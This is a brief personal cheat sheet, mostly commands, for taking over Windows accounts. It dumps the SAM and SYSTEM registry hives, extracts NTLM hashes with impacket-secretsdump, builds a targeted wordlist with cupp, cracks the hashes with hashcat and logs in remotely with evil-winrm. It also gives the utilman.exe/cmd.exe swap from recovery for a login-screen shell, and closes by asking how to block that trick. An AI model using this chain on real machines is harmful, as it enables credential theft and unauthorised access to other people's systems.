open windows cmd in admin
type reg save HKLM\\sam ./sam.save
and  reg save HKLM\\system ./system.save


copy these file to kali

## hashcat
extract the hash
impacket-secretsdump -sam sam.save -system system.save  LOCAL


## cupp
use cupp to generate list of relevant passwords
cupp -i          to open interactive interface


## save it in txt file and crack it
sudo hashcat -m 1000 haarithash haarit.txt 
sudo hashcat -m 1000 haarithash haarit.txt --show

## exploit
use evil-winrm -i ip -user username -p password 

enjoy







Open cmd from recovery

- type c:
- ren utilman.exe utilman1.exe
- ren cmd.exe utilman.exe

how to stop cmd from accessibility menu